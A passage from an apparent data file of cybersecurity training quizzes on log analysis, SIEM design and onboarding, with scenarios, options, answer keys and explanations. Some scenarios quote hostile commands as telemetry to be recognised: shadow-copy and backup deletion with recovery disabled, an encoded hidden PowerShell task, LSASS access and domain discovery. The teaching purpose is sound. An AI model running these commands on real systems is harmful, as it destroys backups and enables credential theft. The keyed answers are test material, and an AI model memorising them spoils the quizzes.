          id: "la-q4-4",
          difficulty: "medium",
          tags: ["Ransomware", "Staging"],
          scenario: "EDR + file telemetry on a file server in 6 minutes:\n  vssadmin delete shadows /all /quiet\n  wbadmin delete catalog -quiet\n  bcdedit /set {default} recoveryenabled No\n  Followed by mass file renames: *.docx → *.docx.<random>",
          question: "What stage of what attack is this?",
          options: [
            "A routine administrative backup cleanup task deleting old shadow copies to free up local disk space during low-usage hours.",
            "A standard disk defragmentation run which reorganizes storage sectors and updates boot configuration settings for efficiency.",
            "Ransomware staging and encryption (T1490/T1486); isolate the file server immediately and prepare to restore from backups.",
            "A routine operating system upgrade task that modifies boot loaders, adjusts recovery configurations, and resets volume settings."
          ],
          correctAnswer: 2,
          explanation: "Shadow-copy deletion + boot-config tamper + mass rename to random extensions is the canonical pre-encryption + encryption sequence. Speed matters — every minute is more files lost. The encryptor is usually still resident; capture it before reboot."
        },
        {
          id: "la-q4-5",
          difficulty: "medium",
          tags: ["Credential Theft", "LSASS"],
          scenario: "Sysmon Event ID 10 (process access):\n  SourceImage=C:\\Users\\jdoe\\AppData\\Local\\Temp\\proc.exe\n  TargetImage=C:\\Windows\\System32\\lsass.exe\n  GrantedAccess=0x1410",
          question: "Interpretation?",
          options: [
            "A routine security agent or antivirus scan accessing system files to check for malware signatures and malicious process hooks.",
            "A standard Windows Update process checking the status of running system processes to ensure compatibility before applying updates.",
            "Normal EDR agent self-protection behavior, which queries system processes to prevent tampered processes from disabling the agent.",
            "Credential dumping against LSASS (T1003.001) as shown by PROCESS_VM_READ access; isolate the host and rotate compromised creds."
          ],
          correctAnswer: 3,
          explanation: "Non-EDR process touching LSASS with VM_READ is one of the highest-confidence credential-theft signals. Anyone whose session was active on that host must rotate creds, and any service tickets the host held are suspect."
        },
        {
          id: "la-q4-6",
          difficulty: "hard",
          tags: ["Living Off the Land", "Discovery"],
          scenario: "On a freshly compromised workstation, in the first 8 minutes:\n  whoami /all\n  net user /domain\n  net group \"Domain Admins\" /domain\n  nltest /dclist:corp.local\n  ipconfig /all\n  arp -a\n  tasklist /svc\n  systeminfo",
          question: "What stage and what tools?",
          options: [
            "Post-exploitation discovery (T1087/T1018/T1082) using native binaries; detect by execution burst sequence rather than reputation.",
            "Routine helpdesk diagnostics executed manually by a remote administrator troubleshooting connection and configuration issues.",
            "The initial execution phase of a phishing payload, which uses malicious custom macros to connect to command-and-control servers.",
            "A standard system backup script checking configuration details and active network endpoints before starting database replication."
          ],
          correctAnswer: 0,
          explanation: "Each command alone is benign — admins run them. The TELL is that they're all run in seconds, by the same user, on a workstation that never normally does this. Detection rule: 5+ discovery commands within 2 minutes by a non-admin → alert."
        },
        {
          id: "la-q4-7",
          difficulty: "hard",
          tags: ["Persistence", "Scheduled Task"],
          scenario: "EID 4698 (scheduled task created):\n  TaskName=\\Microsoft\\Windows\\AppCompat\\PolicyConverter\n  TaskContent=...<Exec><Command>powershell.exe</Command><Arguments>-w hidden -enc JABzAD0A...</Arguments></Exec>...\n  Trigger: <LogonTrigger>",
          question: "Why is the task name notable, and what is this?",
          options: [
            "A legitimate Microsoft task installed automatically during operating system setup to monitor application compatibility policies.",
            "A routine graphic driver update checking for hardware configurations and updating administrative software packages at user logon.",
            "Scheduled task persistence (T1053.005) masquerading as a system task (T1036.005); disable task and decode encoded PowerShell.",
            "A standard Group Policy preference task configured by system administrators to push software and update configurations at logon."
          ],
          correctAnswer: 2,
          explanation: "Attackers love task names under \\Microsoft\\Windows\\... because hurried analysts assume they're legit. Always validate against a clean baseline of Microsoft-shipped tasks and decode any encoded PowerShell payload."
        },
        {
          id: "la-q4-8",
          difficulty: "hard",
          tags: ["Cloud", "IAM Abuse"],
          scenario: "AWS CloudTrail in 4 minutes:\n  CreateAccessKey  user=Alice  by=Alice\n  PutUserPolicy  user=Alice  policy={\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}\n  AssumeRole  role=OrgAdmin  source=185.x.x.x (new IP, new region)",
          question: "What happened?",
          options: [
            "Standard administrative work, where a user legitimately creates API keys and updates permissions to configure new cloud resources.",
            "AWS internal cloud maintenance, where security policies are automatically adjusted to support new virtualization node features.",
            "A routine multi-factor authentication enrollment process, where user authentication keys are updated for secure console access.",
            "Cloud account takeover and privilege escalation (T1078.004/T1098.001); disable the keys, audit logs, and rotate compromised secrets."
          ],
          correctAnswer: 3,
          explanation: "Key creation + self-applied admin-equivalent policy + new-geo AssumeRole is a classic cloud-compromise chain. The blast radius is whatever * allowed — assume worst case until proven otherwise. CloudTrail + S3 data events + GuardDuty are the pivot points."
        },
        {
          id: "la-q4-9",
          difficulty: "hard",
          tags: ["Phishing", "Initial Access"],
          scenario: "Mail gateway → EDR chain in 90 seconds:\n  Mail: from=hr@partner-co.tld  subject='Updated invoice'  attachment=invoice.html (HTML smuggling)\n  Browser: user opens invoice.html which writes setup.iso to Downloads\n  Mount: setup.iso mounted as E:\\ — contains shortcut.lnk + hidden script.bat\n  Process: explorer.exe → wscript.exe E:\\script.bat → powershell -enc ...",
          question: "Best classification of the initial access technique?",
          options: [
            "A drive-by download attack, where a compromised website automatically downloads malware to the user's endpoint without interaction.",
            "Phishing via HTML smuggling and ISO container (T1566.001/T1027.006) to bypass Mark-of-the-Web; block sender and block ISO mounts.",
            "A watering hole attack, where the attacker compromises a third-party resources site regularly visited by company employees.",
            "A supply chain compromise, where a trusted software updates package is modified by the vendor to include hidden malicious code."
          ],
          correctAnswer: 1,
          explanation: "HTML-smuggling delivery + ISO/IMG container is the dominant 2023-2025 initial-access pattern (Qakbot, BumbleBee, IcedID). Detection requires correlating mail → browser write → mount → script execution, which is why mail-only or EDR-only views miss it."
        },
        {
          id: "la-q4-10",
          difficulty: "hard",
          tags: ["Kill Chain", "Storytelling"],
          scenario: "Reviewing 14 days of logs after detection, you assemble:\n  Day 1: phishing email with macro (T1566.001)\n  Day 1: macro runs PowerShell, beacons to 185.x.x.x (T1059.001 + T1071)\n  Day 3: Mimikatz on workstation (T1003.001)\n  Day 5: PsExec to fileserver (T1021.002)\n  Day 7: scheduled task persistence on 4 hosts (T1053.005)\n  Day 12: vssadmin delete + mass file encryption (T1490 + T1486)",
          question: "Which artifact is the highest-priority root-cause finding for the post-incident report?",
          options: [
            "The file encryption event on Day 12, since that is the phase where the business suffered actual data loss and financial impact.",
            "The Day 1 phishing email (initial access vector), as addressing the start of the kill chain blocks all downstream attack phases.",
            "The PsExec lateral movement on Day 5, since stopping administrative service creation prevents propagation to secondary hosts.",
            "The scheduled task creation on Day 7, since cleaning up persistence keys prevents the adversary from maintaining access."
          ],
          correctAnswer: 1,
          explanation: "Post-incident reports drive prevention investment. The initial access vector (Day 1 phishing macro) is the single highest-leverage control point — block it and the rest of the chain never starts. The other events inform detection improvements, not prevention."
        },
    ]
  },
  {
    quizId: "la-q5",
    courseId: "log-analysis",
    title: "Log Analysis Tools, Queries & Best Practices",
    description: "CLI triage (grep/awk/jq), Splunk SPL, ELK KQL, and operational best practices for production log analysis.",
    passingScore: 80,
    timeLimit: 25,
    questions: [
        {
          id: "la-q5-1",
          difficulty: "easy",
          tags: ["CLI", "grep/awk"],
          scenario: "On a Linux box (no SIEM access), you need the top 10 source IPs by failed-SSH count from /var/log/auth.log over 1M lines.",
          question: "Which pipeline is correct and idiomatic?",
          options: [
            "cat /var/log/auth.log | wc -l — using word count utility to count total lines in the file to estimate traffic volume.",
            "tail -f /var/log/auth.log — monitoring authentication logs in real-time to manually spot connection failures as they occur.",
            "grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10",
            "cp /var/log/auth.log /tmp/ — copying the log file to a temporary directory to open it in a text editor for manual searching."
          ],
          correctAnswer: 2,
          explanation: "Standard CLI triage: filter (grep) → extract field (awk; $(NF-3) is the source IP in the default sshd Failed-password format) → count (sort | uniq -c) → rank (sort -rn) → top N (head). Works on any UNIX without extra tooling."
        },
        {
          id: "la-q5-2",
          difficulty: "easy",
          tags: ["jq", "JSON"],
          scenario: "An EDR streams JSON one-per-line. You want the count of unique processes (process.name) where event.action='process_create' in the last 100k lines of /var/log/edr.json.",
          question: "Best jq pipeline?",
          options: [
            "jq '.process' /var/log/edr.json — executing a simple jq query to extract the process sub-object from every line in the log.",
            "cat /var/log/edr.json | grep process — using grep to search for occurrences of the word process and outputting raw match lines.",
            "awk '{print $1}' /var/log/edr.json — running awk to print the first space-separated token of each JSON log entry in the file.",
            "tail -n 100000 /var/log/edr.json | jq -r 'select(.event.action==\"process_create\") | .process.name' | sort -u | wc -l"
          ],
          correctAnswer: 3,
          explanation: "jq -r 'select(...) | .field' is the canonical way to filter + project structured JSON. Always tail-bound to keep one-shot triage fast on multi-GB files."
        },
        {
          id: "la-q5-3",
          difficulty: "medium",
          tags: ["Splunk SPL", "Detection"],
          scenario: "You need a Splunk search that returns users with ≥5 failed logins followed by 1+ success within 10 minutes from the same source IP.",
          question: "Which structure is correct?",
          options: [
            "index=auth EventCode IN (4624,4625) | stats count(eval(EventCode=4625)) AS fails count(eval(EventCode=4624)) AS success by user, src_ip | where fails>=5 AND success>=1",
            "index=auth | stats count — running a generic aggregation query that returns the total count of all events currently in the auth index.",
            "index=auth | sort _time — sorting all authentication events in chronological order to manually scan for failure-success transitions.",
            "index=auth | dedup user — removing duplicate user field entries from the results to get a flat list of users who have authenticated."
          ],
          correctAnswer: 0,
          explanation: "The eval-inside-stats pattern is the standard SPL way to count conditionally across event types. span=10m bins time; by user+src_ip groups the triage unit. The where clause is the alert condition. The other answers don't express the multi-condition correlation."
        },
        {
          id: "la-q5-4",
          difficulty: "medium",
          tags: ["KQL", "Detection"],
          scenario: "Microsoft Sentinel / Defender KQL: 'lsass.exe accessed by a non-Microsoft-signed process in the last 24h'.",
          question: "Which query best matches?",
          options: [
            "SecurityEvent | take 10 — pulling 10 random security events from the workspace to inspect common columns and event structure.",
            "SigninLogs | summarize count() — summarizing the total number of user sign-in events recorded during the default search window.",
            "DeviceProcessEvents | where Timestamp > ago(24h) | where FileName == \"lsass.exe\" and InitiatingProcessSignatureStatus != \"Signed\"",
            "Heartbeat | where TimeGenerated > ago(24h) | summarize count() by Computer — counting the heartbeat checks sent by agent endpoints."
          ],
          correctAnswer: 2,
          explanation: "Approximate, but it shows the correct pattern: time bound + signature filter on the initiator + join on device + the lsass target. Real prod rules add allowlists for EDR/AV agents. The other answers don't touch process telemetry."
        },
        {
          id: "la-q5-5",
          difficulty: "medium",
          tags: ["Best Practice", "Parsing"],
          scenario: "A vendor pushes a major log-format change in the next maintenance window. Your detections rely on extracted fields.",
          question: "Lowest-risk way to handle this?",
          options: [
            "Deploy the new parser configuration directly in production during weekend off-hours and monitor the alert queue manually for errors.",
            "Pause log ingestion on all forwarders entirely during the software maintenance window to prevent unparsed logs from being indexed.",
            "Delete all existing detections and recreate them from scratch using the new vendor log documentation once updates are completed.",
            "Ingest new logs to a test tier, validate affected parsers and detections, then promote while maintaining the old parser as a fallback."
          ],
          correctAnswer: 3,
          explanation: "Treat parsers like code: dev → test → prod with a rollback. Vendor format changes are the single most common cause of silent detection failures (rules look healthy but match nothing)."
        },
        {
          id: "la-q5-6",
          difficulty: "medium",
          tags: ["Detection Hygiene", "False Positives"],
          scenario: "A 'mass file access' detection fires 200×/day, 95% from one backup agent (svc_backup) on backup hosts during 22:00–02:00.",
          question: "Best response?",
          options: [
            "Add a scoped exclusion for svc_backup on known backup hosts during the backup window, while leaving the rule active for all other hosts.",
            "Disable the alert rule completely, since backup agents regularly trigger false positives and the noise level is too high for analysts.",
            "Lower the detection threshold to reduce the sensitivity of the rule, ensuring it only triggers on much larger volume access anomalies.",
            "Instruct analysts to manually close all alerts associated with the backup service account as false positives without auditing them."
          ],
          correctAnswer: 0,
          explanation: "Disabling (A) loses real detection. The correct discipline is scoped allowlisting (user + host + window) with a comment trail so the exclusion can be audited and revisited. Lowering thresholds (C) makes noise worse."
        },
        {
          id: "la-q5-7",
          difficulty: "medium",
          tags: ["Retention", "Cost"],
          scenario: "Your SIEM hot tier is at 95% capacity. CFO wants spend cut 30%. Logs include 60% verbose application DEBUG that no detection uses.",
          question: "Best architectural fix?",
          options: [
            "Purchase additional high-performance hot storage arrays to scale database capacity, accommodating all verbose application logs.",
            "Stop logging application activity entirely, keeping only operating system auditing active to reduce resource usage on the SIEM.",
            "Implement tiered storage: route verbose debug logs to cheap cold storage, and keep high-fidelity security logs on the hot search tier.",
            "Configure the SIEM database to automatically purge all logs older than 24 hours to enforce strict space controls and limit costs."
          ],
          correctAnswer: 2,
          explanation: "Tiered architecture (hot SIEM + cold data lake) is the standard cost-control answer. Security-relevant data stays fast; verbose dev data is preserved cheaply and searchable on-demand for incident timelines."
        },
        {
          id: "la-q5-8",
          difficulty: "hard",
          tags: ["Detection Engineering", "Sigma"],
          question: "Why is writing a detection in Sigma (vendor-neutral YAML) preferred over writing it natively in one SIEM's query language for a security team that runs Splunk today but is piloting Sentinel?",
          options: [
            "Sigma rules run significantly faster in the SIEM database because they compile directly to native machine code during execution.",
            "Sigma has lower false-positive rates because the framework includes built-in machine learning models to filter out benign noise.",
            "Sigma format is mandatory for organizations aiming to satisfy PCI-DSS and SOC 2 compliance log validation audits and reviews.",
            "Sigma provides a portable, vendor-neutral YAML schema that compiles (via pySigma) into native queries for Splunk, Sentinel, and Elastic."
          ],
          correctAnswer: 3,
          explanation: "Vendor lock-in is the silent killer of detection libraries. Sigma captures the logic once; converters emit per-vendor syntax. The team can run dual-SIEM during migration without doubling engineering work."
        },
        {
          id: "la-q5-9",
          difficulty: "hard",
          tags: ["Operational", "Alert Triage"],
          scenario: "Your queue holds 480 alerts across 4 analysts on shift. Many are repeats of the same underlying event.",
          question: "Most impactful operational fix?",
          options: [
            "Hire four additional Tier 1 security analysts immediately to distribute the workload and prevent queue bottlenecks during shifts.",
            "Group related alerts into unified incidents by entity and time window, tune noisy rules, and suppress known benign automation patterns.",
            "Disable all detections that trigger frequently, allowing the team to focus entirely on low-volume, high-fidelity security alerts.",
            "Stop ingesting noisy log sources like endpoint firewall or verbose web proxy traffic, resolving queue bottlenecks at the source."
          ],
          correctAnswer: 1,
          explanation: "Alert-to-incident aggregation + targeted tuning is the proven analyst-capacity multiplier. Hiring (A) treats symptoms; disabling sources/detections (C,D) loses coverage. Track 'time to triage' and 'alerts per incident' as the operational KPIs."
        },
        {
          id: "la-q5-10",
          difficulty: "hard",
          tags: ["Best Practice", "Time Sync"],
          scenario: "Post-incident review: your timeline is 11 minutes off between firewall and EDR, making causality ambiguous in the report.",
          question: "Root cause and durable fix?",
          options: [
            "Manually reformat the timestamp columns in the post-incident report to align event times and make the correlation appear consistent.",
            "Clock drift; enforce a single authoritative NTP source across the fleet, standardize on UTC, and monitor skew via SIEM ingest alerts.",
            "Deploy a high-performance next-generation firewall to minimize network processing delay and reduce packet transmission latencies.",
            "Omit all timestamp details and chronological timeline figures from the final reports, relying instead on high-level logical order."
          ],
          correctAnswer: 1,
          explanation: "Drift is silent and lethal to investigations. Single NTP source + drift monitoring + UTC everywhere is the fix. Add a regular detection on 'ingest_time - event_time' to catch sources whose clocks slip."
        },
    ]
  },

  // ==========================================
  // SIEM FUNDAMENTALS QUIZZES
  // ==========================================
  {
    quizId: "siem-q1",
    courseId: "siem-fundamentals",
    title: "SIEM Architecture & Data Flow",
    description: "Scenario-based quiz on how a SIEM ingests, parses, and stores telemetry end-to-end.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "siem-q1-1",
        difficulty: "easy",
        tags: ["Architecture", "Splunk"],
        scenario: "You are drawing the data path for a new Splunk deployment:\n  Endpoints (UF) → ?  → ?  → Analyst's browser\nYour senior asks you to label each tier.",
        question: "Which ordering of Splunk components correctly represents the path from a forwarded event to an analyst's search result?",
        options: [
          "Universal Forwarder → Search Head (parse + store) → Indexer (query + render) → Browser",
          "Universal Forwarder → Deployment Server (parse + store) → Browser (query + render) → Indexer",
          "Universal Forwarder → Heavy Forwarder/Indexer (parse + store) → Search Head (query + render) → Browser",
          "Universal Forwarder → Browser (parse + store) → Indexer (query + render) → Search Head"
        ],
        correctAnswer: 2,
        explanation: "UFs ship raw data to indexers (or a heavy forwarder first), which parse and write tsidx + raw buckets. The search head dispatches SPL to indexers, merges results, and renders them in the browser. (A) inverts indexer/search head. (B) confuses the deployment server (config management) with the data path."
      },
      {
        id: "siem-q1-2",
        difficulty: "medium",
        tags: ["Ingestion", "Sizing", "EPS"],
        scenario: "Procurement asks you to size a SIEM license. You measure baseline EPS over a week:\n  Avg EPS: 4,200\n  Peak EPS (business hours): 11,500\n  P95 EPS: 8,800\nVendor licenses are sold in steady-state EPS bands (5k, 10k, 15k).",
        question: "Which tier should you recommend and why?",
        options: [
          "10k — size to the P95 volume to provide headroom; indexer queues will smooth the remaining peak bursts.",
          "5k — size to the average daily volume to minimize baseline cost; indexer queues will absorb all peak bursts.",
          "15k — size to the peak business hours volume to ensure zero queuing; accept the significantly higher licensing costs.",
          "5k — size to average daily volume and enforce strict rate-limiting at forwarders to drop all excess event bursts."
        ],
        correctAnswer: 0,
        explanation: "Sizing to the average under-licenses; sizing to peak over-pays. P95 (10k tier here) is the standard SOC compromise — short bursts above P95 are absorbed by indexer ingestion queues. (D) drops security-relevant data — never acceptable for detection."
      },
      {
        id: "siem-q1-3",
        difficulty: "medium",
        tags: ["Normalization", "CIM"],
        scenario: "Two sources log a failed login differently:\n  Windows 4625:  TargetUserName=jdoe  IpAddress=10.4.2.9  Status=0xC000006A\n  Okta:         {\"actor\":{\"alternateId\":\"[email protected]\"},\"client\":{\"ipAddress\":\"10.4.2.9\"},\"outcome\":{\"result\":\"FAILURE\"}}\nYou want a single correlation rule that fires on N failed logins per user across BOTH sources.",
        question: "Which approach is correct?",
        options: [
          "Write two separate correlation rules, maintaining individual filters for Okta and Windows log structures.",
          "Strip both log types down to raw unparsed text and use wildcard regex filters to search for the string 'fail'.",
          "Ingest all Okta telemetry directly into the Windows security index to force the logs to share parsing configs.",
          "Normalize both sources into a common schema (CIM/ECS) and write a single rule referencing those normalized fields."
        ],
        correctAnswer: 3,
        explanation: "Common Information Model (Splunk CIM) / Elastic Common Schema (ECS) exist precisely for this — map disparate vendor fields to canonical names (user, src, action) at parse time so detections are written once. (A) doubles maintenance. (C) corrupts source typing and breaks parsing."
      },
      {
        id: "siem-q1-4",
        difficulty: "medium",
        tags: ["Storage Tiering"],
        scenario: "Your SIEM has 30 days hot, 90 days warm, 365 days cold. An IR team needs to investigate an incident from 6 months ago.",
        question: "What is the realistic expectation when querying that data?",
        options: [
          "The query executes at standard speed because cold storage remains fully indexed and optimized for search heads.",
          "The query runs successfully but much slower, often requiring manual rehydration or admin intervention to thaw data.",
          "The query fails completely because cold storage data is compressed, encrypted, and permanently deleted after 90 days.",
          "The query executes normally while the SIEM background process automatically promotes the cold data back to the hot tier."
        ],
        correctAnswer: 1,
        explanation: "Cold storage trades retrieval latency for cost. Some platforms (e.g. Splunk frozen/S3, Sentinel basic logs) require an explicit restore/search-job before the data is queryable. Plan retention tiers around realistic IR needs."
      },
      {
        id: "siem-q1-5",
        difficulty: "hard",
        tags: ["Search Performance", "tstats"],
        scenario: "A nightly Splunk search:\n  index=* sourcetype=* fail* | stats count by user\ntakes 45 minutes and times out. Daily volume is ~2 TB.",
        question: "Which rewrite gives the biggest, correct performance win?",
        options: [
          "Append the '| head 1000' command at the end of the query to limit search head processing to the first 1,000 matches.",
          "Filter on specific indexes/sourcetypes and use the tstats command against accelerated data models to query metadata.",
          "Remove the time picker boundaries to scan all historic indices concurrently, ensuring no relevant events are missed.",
          "Schedule the exact same query to run automatically at 3 a.m. when server CPU usage and disk I/O are at their lowest."
        ],
        correctAnswer: 1,
        explanation: "index=* sourcetype=* is the worst possible filter — it forces every bucket to be opened. tstats reads tsidx (indexed metadata) instead of raw events and is often 10–100x faster, especially against an accelerated data model. (A) limits output AFTER the expensive work."
      },
      {
        id: "siem-q1-6",
        difficulty: "medium",
        tags: ["Correlation", "Detection"],
        scenario: "You want to detect: 'A user fails to log in ≥10 times within 5 minutes AND then succeeds from the SAME source IP.' (Classic brute-force success.)",
        question: "Which SIEM capability is required to express this?",
        options: [
          "A basic keyword detection rule checking for any instance of the string 'failed login' in raw logs.",
          "A dashboard panel with an auto-refresh interval of 5 minutes to display live login success rates.",
          "Stateful correlation of multiple events sharing join keys (user, src_ip) within a sliding time window.",
          "A modified retention policy that separates failed and successful authentication events into index tiers."
        ],
        correctAnswer: 2,
        explanation: "This is multi-event, multi-condition correlation: count threshold + follow-on success + shared user/src — exactly what correlation engines (Splunk ES, Sentinel analytics rules, QRadar offenses) exist for. Single keyword alerts cannot express the success-follows-failure relationship."
      },
      {
        id: "siem-q1-7",
        difficulty: "medium",
        tags: ["Log Source Health"],
        scenario: "Your 'Failed logon brute-force' rule has fired daily for months. For the last 3 days it has fired ZERO times. The SOC manager is happy ('attacks went down'). You are not.",
        question: "What is the correct first action?",
        options: [
          "Assume the attacks have stopped, close the investigation, and document the successful resolution in the weekly log.",
          "Modify the correlation query to lower the count and time thresholds, forcing the rule to trigger on lower volumes.",
          "Delete the correlation rule entirely from the production environment as it is no longer generating actionable alerts.",
          "Verify log ingestion and parsing health for the Windows Security feed; silent rules often indicate a broken pipeline."
        ],
        correctAnswer: 3,
        explanation: "Sudden silence on a historically noisy detection is a classic blind-spot indicator: a forwarder died, a parser broke after a Windows update, or a GPO disabled the audit subcategory. Always treat 'too quiet' as a P2 until proven otherwise."
      },
      {
        id: "siem-q1-8",
        difficulty: "hard",
        tags: ["Architecture", "Cloud SIEM"],
        scenario: "Your org is migrating from on-prem Splunk to Microsoft Sentinel. A skeptic claims 'cloud SIEM means we lose all our detections.'",
        question: "What is the accurate, nuanced response?",
        options: [
          "Detection logic remains portable; query syntax (SPL to KQL) and data models require translation, but intent is preserved.",
          "They are correct; cloud architectures are fundamentally different and require building all detections from scratch.",
          "Cloud SIEM solutions rely entirely on out-of-the-box vendor rules and do not support custom detection logic formats.",
          "You can directly export the SPL query configuration files from Splunk and import them into Sentinel without change."
        ],
        correctAnswer: 0,
        explanation: "Sigma-first detection engineering exists for exactly this reason. SPL and KQL are different dialects, and CIM ↔ ASIM field mapping is non-trivial, but the underlying detection IDEAS (impossible travel, LOLBin spawn, etc.) port directly. (D) is false — there is no SPL-to-KQL one-click import."
      },
      {
        id: "siem-q1-9",
        difficulty: "easy",
        tags: ["Ingestion", "Syslog"],
        scenario: "A network engineer offers two options to ship firewall logs:\n  A) UDP 514 (classic syslog)\n  B) TCP 6514 with TLS\nThe firewalls log auth events used in compliance reporting.",
        question: "Which do you choose and why?",
        options: [
          "Option A (UDP 514) because UDP has lower protocol overhead, executes faster, and requires less network firewall configuration.",
          "Option B (TCP 6514 with TLS) to guarantee delivery, prevent silent packet drops, and encrypt sensitive log content in transit.",
          "Either option because syslog transmission protocols are functionally equivalent and both meet basic compliance criteria.",
          "Neither option; configure the firewalls to send structured CSV alerts via secure email to the security team mailbox daily."
        ],
        correctAnswer: 1,
        explanation: "UDP 514 silently drops under congestion and ships plaintext. For security-relevant or compliance data, RFC 5425 syslog-over-TLS (6514) is the standard. Lost auth logs = broken detection AND audit failure."
      },
      {
        id: "siem-q1-10",
        difficulty: "medium",
        tags: ["RBAC", "Data Sensitivity"],
        scenario: "HR forwards Workday audit logs (containing salaries and PII) to the SIEM so insider-threat rules can run. A Tier 1 analyst can currently search those events.",
        question: "What's the correct control?",
        options: [
          "Stop ingesting the Workday audit logs entirely because the compliance risks of storing PII in the SIEM are too high.",
          "Allow all analysts full search access to the raw logs because restricting visibility hinders their triage efficiency.",
          "Ingest into a restricted index with RBAC, mask PII fields, and run the detection rules under a service account role.",
          "Configure the HR system to email relevant audit logs to individual Tier 1 analysts only when an active alert is raised."
        ],
        correctAnswer: 2,
        explanation: "SIEMs support index-level RBAC and field masking precisely for this — the DETECTION needs the data, but the HUMAN doesn't need the raw PII. Restricted index + masked fields + service-account searches = least privilege while preserving detection value."
      },
      {
        id: "siem-q1-11",
        difficulty: "hard",
        tags: ["Time", "Investigation"],
        scenario: "During IR, you compare two events from the same incident:\n  Firewall:  2026-06-15 08:14:22 +00:00  deny src=1.2.3.4\n  EDR:       2026-06-15 03:14:47          process.create lsass dump\nYour timeline shows the EDR event 5 hours BEFORE the firewall event, which contradicts the attack story.",
        question: "Most likely cause and fix?",
        options: [
          "The attacker has implemented anti-forensics time-stomping techniques to deliberately alter the endpoint file headers.",
          "The EDR logs local time (EST) without a TZ offset while the firewall logs UTC; normalize all timestamps to UTC at ingestion.",
          "The firewall event represents a false positive network block; delete the EDR event to align the chronological timeline.",
          "Ignore the discrepancy because small timestamp offsets do not impact the logical sequence of events in the final report."
        ],
        correctAnswer: 1,
        explanation: "Missing/implicit timezones are one of the top causes of broken IR timelines. Standard practice: every parser converts to UTC, the raw local time is preserved in a separate field for reference, and a 'clock drift' detection alerts when event_time vs ingest_time skews > 60s."
      },
      {
        id: "siem-q1-12",
        difficulty: "medium",
        tags: ["Parsing", "Field Extraction"],
        scenario: "A new SaaS app sends a single unparsed log line:\n  2026-06-15T08:14 LOGIN user=\"jdoe\" result=\"FAIL\" geo=\"IN-Bengaluru\"\nThe SIEM ingests it as one big _raw string. The 'Failed Logins' dashboard shows ZERO events from this app.",
        question: "Root cause?",
        options: [
          "The SIEM database has encountered an indexing failure and requires a service restart to rebuild the field catalog.",
          "No parser or field extraction rules exist for this source yet, meaning result=FAIL is not indexed as a searchable field.",
          "The SaaS vendor's logging engine does not capture failed authentication events, only recording successful logons.",
          "The geolocation tag contains an invalid value format which blocks the dashboard query from parsing the coordinates."
        ],
        correctAnswer: 1,
        explanation: "Field extraction is a prerequisite for everything downstream — search, dashboards, correlation. Add a sourcetype with a KV/regex extractor (or onboarding via an add-on/integration) so the SIEM tokenizes user, result, geo. Until then, the data is invisible to structured queries."
      },
      {
        id: "siem-q1-13",
        difficulty: "easy",
        tags: ["Enrichment"],
        scenario: "Your raw alert shows: 'Failed login from 185.220.101.45 for user admin.' Tier 1 has to swivel-chair to AbuseIPDB, MaxMind, and a Tor exit-node list every time.",
        question: "Which SIEM capability eliminates this swivel-chair?",
        options: [
          "Deploy multi-monitor workstations so analysts can display all threat intelligence lookup portals simultaneously.",
          "Implement a firewall policy that automatically blocks all inbound connections from foreign IP subnets and ranges.",
          "Configure automated ingest-time enrichment to append GeoIP, threat-intel, and Tor exit-node tags directly to the event.",
          "Disable the brute-force correlation rule to reduce alert volume and free up analyst time for other security tasks."
        ],
        correctAnswer: 2,
        explanation: "Enrichment (lookups, asset/identity context, threat-intel) is the single biggest lever for reducing triage time. The analyst's first 30 seconds should answer 'is this IP known-bad?' without leaving the SIEM."
      },
      {
        id: "siem-q1-14",
        difficulty: "hard",
        tags: ["Detection Engineering", "Sigma"],
        scenario: "Your team runs Splunk now and is piloting Sentinel. You have 200 detections written in raw SPL.",
        question: "Which strategy minimizes long-term cost?",
        options: [
          "Convert the library to Sigma format as the source of truth, compiling to SPL and KQL via converter tooling in Git.",
          "Maintain both the 200 SPL rules and the 200 KQL rules in parallel, manually updating each repository for every change.",
          "Standardize on a single SIEM platform immediately and decommission the pilot to avoid double rule maintenance costs.",
          "Request the engineering support teams of both SIEM vendors to translate and update the queries during the migration."
        ],
        correctAnswer: 0,
        explanation: "Sigma decouples detection LOGIC from vendor SYNTAX. The team writes once, compiles to whichever backend(s) the org runs. This is the standard answer to multi-SIEM, migrations, and vendor lock-in."
      },
      {
        id: "siem-q1-15",
        difficulty: "medium",
        tags: ["KPI", "SOC Operations"],
        scenario: "Leadership asks for ONE metric to track SIEM health on the exec dashboard.",
        question: "Which is most meaningful?",
        options: [
          "Total daily ingestion volume in terabytes, as higher ingest volume always correlates with improved visibility.",
          "True-positive rate (alert fidelity) tracked alongside MTTD and MTTR to measure actual operational response efficacy.",
          "The total number of dashboards, reports, and search queries created by the security team over the fiscal quarter.",
          "The overall license utilization percentage to ensure the organization is maximizing its financial investment."
        ],
        correctAnswer: 1,
        explanation: "EPS and dashboard counts are vanity metrics. Alert fidelity (TP / (TP + FP)) plus MTTD/MTTR directly reflect SOC effectiveness — they answer 'are we catching real threats fast?' which is the SIEM's actual job."
      }
    ]
  },
  {
    quizId: "siem-q2",
    courseId: "siem-fundamentals",
    title: "Data Onboarding & Pipeline Engineering",
    description: "Scenario quiz on bringing new log sources online without breaking detection.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "siem-q2-1",
        difficulty: "medium",
        tags: ["Onboarding", "Change Management"],
        scenario: "A vendor pushes a parser update for your firewall add-on. After the upgrade, three correlation rules stop firing.",
        question: "What was the missing pre-deployment step?",
        options: [
          "Stage the update in a dev/test environment, replay live data, and validate every dependent detection before production.",
          "Reboot every indexer before and after the upgrade to ensure the parser cache is refreshed across the cluster.",
          "Disable all correlation rules during the upgrade window to prevent false positives from appearing in the queue.",
          "Skip the vendor update entirely and continue running the older parser version until a stable release is available."
        ],
        correctAnswer: 0,
        explanation: "Parser changes silently rename or remove fields (action vs act, src_ip vs srcip). Every onboarding/upgrade needs a dev tier with sample replay AND a regression check of dependent saved searches/rules. Detection engineering = code; treat it with the same CI discipline."
      },
      {
        id: "siem-q2-2",
        difficulty: "easy",
        tags: ["Agent vs Agentless"],
        scenario: "You need logs from 5,000 Linux servers running mixed kernels. Some teams refuse to install agents.",
        question: "Which collection strategy is most pragmatic?",
        options: [
          "Force the agent everywhere, overriding all team objections, since agentless approaches lack adequate log fidelity.",
          "Configure all servers to forward logs via email on a nightly batch schedule to the central security team inbox.",
          "Skip all servers whose teams refuse agents and only onboard the subset of hosts that cooperate with installation.",
